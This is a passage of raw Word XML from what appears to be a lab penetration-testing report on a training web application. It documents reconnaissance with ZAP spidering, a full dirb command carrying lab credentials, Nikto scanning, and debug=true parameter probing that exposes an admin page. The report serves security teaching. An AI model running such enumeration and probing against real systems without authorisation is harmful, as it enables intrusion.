          </w:tcPr>
          <w:p w14:paraId="2EACF63B" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Test for Default Credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3C6F0A8D" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="0AF4AA41" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="74E779FD" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="102" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1650" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="57317B31" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00961B3E" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="00ED3CCF">
              <w:t>.</w:t>
            </w:r>
            <w:r w:rsidR="00BD6A81">
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3209" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="204FF09A" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Test for Dangerous HTTP Methods</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="35CE09B4" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3C571C5A" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="4E6713E5" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="102" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1650" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6F3FE22F" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00961B3E" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="00ED3CCF">
              <w:t>.</w:t>
            </w:r>
            <w:r w:rsidR="00BD6A81">
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3209" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="00D507E9" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Test for Web Server Software Bugs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="079D193D" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="30DDF75A" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="8"/>
    </w:tbl>
    <w:p w14:paraId="6373125E" w14:textId="77777777" w:rsidR="00CD4824" w:rsidRDefault="00CD4824" w:rsidP="00ED3CCF">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="9497" w:type="dxa"/>
        <w:tblInd w:w="250" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1752"/>
        <w:gridCol w:w="3209"/>
        <w:gridCol w:w="3402"/>
        <w:gridCol w:w="1134"/>
      </w:tblGrid>
      <w:tr w:rsidR="00961B3E" w14:paraId="7C13078C" w14:textId="77777777" w:rsidTr="00E645F1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1752" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="50947DF5" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00E645F1">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Number</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3209" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="6BB109BA" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00E645F1">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="01CF09BA" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00E645F1">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="7EB4E06F" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00E645F1">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00961B3E" w14:paraId="20DE9CB9" w14:textId="77777777" w:rsidTr="00E645F1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1752" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="01157522" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00E645F1">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3209" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="2F3B42CA" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00E645F1">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Miscellaneous</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="0F7E0406" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00E645F1">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="706D017A" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00E645F1">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="172F1696" w14:textId="77777777" w:rsidR="00961B3E" w:rsidRDefault="00961B3E" w:rsidP="00ED3CCF">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="048246DF" w14:textId="77777777" w:rsidR="0005217B" w:rsidRDefault="009525A9" w:rsidP="0005217B">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc58836565"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure</w:t>
      </w:r>
      <w:r w:rsidR="00257FFB">
        <w:t>: Map application content</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="1BFF28F7" w14:textId="77777777" w:rsidR="00A31651" w:rsidRDefault="00A31651" w:rsidP="00A31651">
      <w:r>
        <w:t>The first stage of the methodology involves mapping the content of the web application. This is vital as it provides crucial data on the structure and components of the web application which allows the later sections to be tailored specifically to this web application and streamline the process of identifying and cataloging vulnerabilities. This is because it can inform as to the technologies the web application is and is not using which saves time on testing for things that may not exist, and also point towards systems or technologies that are known to be vulnerable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4545A957" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRPr="0005217B" w:rsidRDefault="004C5A8F" w:rsidP="0005217B"/>
    <w:p w14:paraId="1C7E503D" w14:textId="77777777" w:rsidR="00CD4824" w:rsidRDefault="0052699B" w:rsidP="00CD4824">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc58836566"/>
      <w:r>
        <w:t>Linked Content</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="34D901A3" w14:textId="77777777" w:rsidR="006C53F4" w:rsidRDefault="003A3D18" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In order to map the </w:t>
      </w:r>
      <w:r w:rsidR="00525598">
        <w:t>application,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> there are a number of different tools and methods. The main tool used to discover the layout of the website was ZAP. It contained a spider function that could be handed an authentication cookie in order to fully explore the website including all content only accessible after logging in.</w:t>
      </w:r>
      <w:r w:rsidR="006C53F4">
        <w:t xml:space="preserve"> This was achieved by capturing the cookie when logging in to the website with ZAP as a proxy. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04209D04" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="0052699B" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>However, the logout.php page also needed to be excluded from the spidering to prevent it from logging itself out before completing the mapping of the website</w:t>
      </w:r>
      <w:r w:rsidR="00BD6D2D">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="006C53F4">
        <w:t xml:space="preserve"> Then, by going through manually, it can be assured that a full list of pages contained in the web application is collected.</w:t>
      </w:r>
      <w:r w:rsidR="00BD6D2D">
        <w:t xml:space="preserve"> This process resulted in the discovery of </w:t>
      </w:r>
      <w:r w:rsidR="0069054E">
        <w:t>200</w:t>
      </w:r>
      <w:r w:rsidR="00BD6D2D" w:rsidRPr="00E645F1">
        <w:t xml:space="preserve"> pieces of content</w:t>
      </w:r>
      <w:r w:rsidR="004025FD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00514AB7" w:rsidRPr="00E645F1">
        <w:t>(Appendix 1.1)</w:t>
      </w:r>
      <w:r w:rsidR="00C42EE0" w:rsidRPr="00E645F1">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72344AE9" w14:textId="77777777" w:rsidR="00B85D70" w:rsidRDefault="00B85D70" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>One of the pieces of content found was</w:t>
      </w:r>
      <w:r w:rsidR="000B71BE">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2AD024" w14:textId="77777777" w:rsidR="00B85D70" w:rsidRDefault="00B85D70" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC5E74">
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>http://192.168.1.20/GTIGCCGDCCFM/doornumbers.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147FECE4" w14:textId="77777777" w:rsidR="000B71BE" w:rsidRDefault="000B71BE" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This seems to include </w:t>
      </w:r>
      <w:r w:rsidR="0069054E">
        <w:t>several</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> door access codes and corresponding door numbers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAFAB51" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="004C5A8F" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="104BF6A7" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00A53E82" w:rsidP="00A53E82">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc58836567"/>
      <w:r>
        <w:t>Other Content</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="4D422F4C" w14:textId="77777777" w:rsidR="00C41D00" w:rsidRDefault="00A53E82" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Dirb was utilized</w:t>
      </w:r>
      <w:r w:rsidR="00A01D83">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>to determine the existence of any hidden content on the website. This could include admin only information that was only intended for use in development. Using the following command Dirb searched the directory for any files not collected in the previous stage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1D4D26" w14:textId="77777777" w:rsidR="00A53E82" w:rsidRDefault="00C41D00" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00C41D00">
        <w:t>dirb http://192.168.1.20 /usr/share/dirb/wordlists/big.txt -u hacklab@hacklab.com:hacklab -o /root/Desktop/output.txt -X ,.php,.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2225A324" w14:textId="77777777" w:rsidR="003079AD" w:rsidRDefault="003079AD" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The results can be </w:t>
      </w:r>
      <w:r w:rsidRPr="00300F7D">
        <w:t xml:space="preserve">found </w:t>
      </w:r>
      <w:r w:rsidR="00300F7D" w:rsidRPr="00300F7D">
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidR="00300F7D">
        <w:t xml:space="preserve"> Appendix 1.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F06B21" w14:textId="56E0DBEC" w:rsidR="00AE00B2" w:rsidRDefault="00AE00B2" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Using Nikto on the program allowed</w:t>
      </w:r>
      <w:r w:rsidR="00A32685">
        <w:t xml:space="preserve"> for the identification of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> any content</w:t>
      </w:r>
      <w:r w:rsidR="00F875B9">
        <w:t xml:space="preserve"> that</w:t>
      </w:r>
      <w:r w:rsidR="00A32685">
        <w:t xml:space="preserve"> is common on a website that</w:t>
      </w:r>
      <w:r w:rsidR="00F875B9">
        <w:t xml:space="preserve"> may be of </w:t>
      </w:r>
      <w:r w:rsidR="00A32685">
        <w:t>interest</w:t>
      </w:r>
      <w:r w:rsidR="00F875B9">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00A139E6">
        <w:t xml:space="preserve">This resulted in the capture of a number of interesting </w:t>
      </w:r>
      <w:r w:rsidR="003079AD">
        <w:t xml:space="preserve">directories. Including some </w:t>
      </w:r>
      <w:r w:rsidR="003079AD" w:rsidRPr="00300F7D">
        <w:t>admin pages</w:t>
      </w:r>
      <w:r w:rsidR="00300F7D" w:rsidRPr="00300F7D">
        <w:t xml:space="preserve"> shown in </w:t>
      </w:r>
      <w:r w:rsidR="00DF7BBC" w:rsidRPr="00300F7D">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="00300F7D" w:rsidRPr="00300F7D">
        <w:t xml:space="preserve"> 1.3 Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="003079AD" w:rsidRPr="00300F7D">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="003F7C0A">
        <w:t xml:space="preserve"> This stage also confirmed that the server was an apache server as a default file linked to the server was also recovered</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4A9CAA" w14:textId="77777777" w:rsidR="003F7C0A" w:rsidRDefault="003F7C0A" w:rsidP="00CD78B0">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65735B0A" wp14:editId="15786B2C">
            <wp:extent cx="5021580" cy="2190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9460" r="63462" b="75000"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5028885" cy="219360"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B691120" w14:textId="77777777" w:rsidR="005532E8" w:rsidRDefault="005532E8" w:rsidP="005532E8">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc58836568"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Non-Standard Access Methods</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="08C303FF" w14:textId="77777777" w:rsidR="00C01BA8" w:rsidRPr="00C01BA8" w:rsidRDefault="00DF7BBC" w:rsidP="00DF7BBC">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>When looking at the results of the spidering done by Zap in Appendix 1.1 t</w:t>
      </w:r>
      <w:r w:rsidR="00C01BA8">
        <w:t xml:space="preserve">here </w:t>
      </w:r>
      <w:r>
        <w:t>were</w:t>
      </w:r>
      <w:r w:rsidR="00C01BA8">
        <w:t xml:space="preserve"> no functions specified in </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">any of </w:t>
      </w:r>
      <w:r w:rsidR="00C01BA8">
        <w:t>the request parameters of this web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7CFB6B" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00411B15" w:rsidP="00D204A8">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>When looking</w:t>
      </w:r>
      <w:r w:rsidR="007062CE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A139E6">
        <w:t xml:space="preserve">through the pages of the web application </w:t>
      </w:r>
      <w:r w:rsidR="00D204A8">
        <w:t>found in section 1.1</w:t>
      </w:r>
      <w:r w:rsidR="0065270F">
        <w:t xml:space="preserve"> a search was carried out to locate any debug functionality. This stage was carried out on a selection of pages including:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C6110A" w14:textId="77777777" w:rsidR="0065270F" w:rsidRDefault="00AE4618" w:rsidP="00AE4618">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="0065270F">
        <w:t>ndex.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468865F4" w14:textId="77777777" w:rsidR="0065270F" w:rsidRDefault="00AE4618" w:rsidP="00AE4618">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>member-profile.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BC19C1" w14:textId="77777777" w:rsidR="00AE4618" w:rsidRDefault="00AE4618" w:rsidP="00AE4618">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t>admin/accounts.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4034F255" w14:textId="77777777" w:rsidR="00AE4618" w:rsidRDefault="00AE4618" w:rsidP="00AE4618">
      <w:r>
        <w:tab/>
        <w:t>This was preformed with a number of toggles including:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A416C0A" w14:textId="77777777" w:rsidR="00AE4618" w:rsidRDefault="00AE4618" w:rsidP="00EC09DC">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>debug=</w:t>
      </w:r>
      <w:r w:rsidR="00EC09DC">
        <w:t xml:space="preserve"> true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADA8836" w14:textId="77777777" w:rsidR="00EC09DC" w:rsidRDefault="00EC09DC" w:rsidP="00EC09DC">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="708" w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t>false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA84B85" w14:textId="77777777" w:rsidR="00EC09DC" w:rsidRDefault="00EC09DC" w:rsidP="00EC09DC">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>test=</w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F66073C" w14:textId="77777777" w:rsidR="00EC09DC" w:rsidRDefault="00EC09DC" w:rsidP="00EC09DC">
      <w:pPr>
        <w:ind w:left="708" w:firstLine="708"/>
      </w:pPr>
      <w:r>
        <w:t>off</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28303B13" w14:textId="77777777" w:rsidR="00AE4618" w:rsidRDefault="00EC09DC" w:rsidP="00EC09DC">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">there was a positive result when submitting </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC09DC">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>debug=true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC09DC">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>192.168.1.20/admin/accounts.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D571D2B" w14:textId="77777777" w:rsidR="008641AC" w:rsidRDefault="008641AC" w:rsidP="00EC09DC">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc58836569"/>
      <w:r>
        <w:t>Procedure: Analyze the application</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="7206EF95" w14:textId="77777777" w:rsidR="002621C7" w:rsidRDefault="00C5399B" w:rsidP="002621C7">
      <w:r w:rsidRPr="00C5399B">
        <w:t xml:space="preserve">This section </w:t>
      </w:r>
      <w:r w:rsidR="004C5A8F" w:rsidRPr="00C5399B">
        <w:t>utili</w:t>
      </w:r>
      <w:r w:rsidR="004C5A8F">
        <w:t>z</w:t>
      </w:r>
      <w:r w:rsidR="004C5A8F" w:rsidRPr="00C5399B">
        <w:t>es</w:t>
      </w:r>
      <w:r w:rsidRPr="00C5399B">
        <w:t xml:space="preserve"> the information gathered previously to form an idea of which parts of the web application are most likely to provide positive vectors of attack</w:t>
      </w:r>
      <w:r>
        <w:t>. This allows for a basis to be created, from which individual areas of the application can be highlighted and further examined for possible vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2215BA" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRPr="002621C7" w:rsidRDefault="004C5A8F" w:rsidP="002621C7"/>
    <w:p w14:paraId="29A837F2" w14:textId="77777777" w:rsidR="00A0010C" w:rsidRDefault="00A0010C" w:rsidP="00A0010C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc58836570"/>
      <w:r>
        <w:t>Identify functionality and data entry points</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="3576FB4F" w14:textId="77777777" w:rsidR="00A0010C" w:rsidRDefault="003C4D81" w:rsidP="003C4D81">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>There are a number of functionalities set up throughout this web application.</w:t>
      </w:r>
      <w:r w:rsidR="00C42A28">
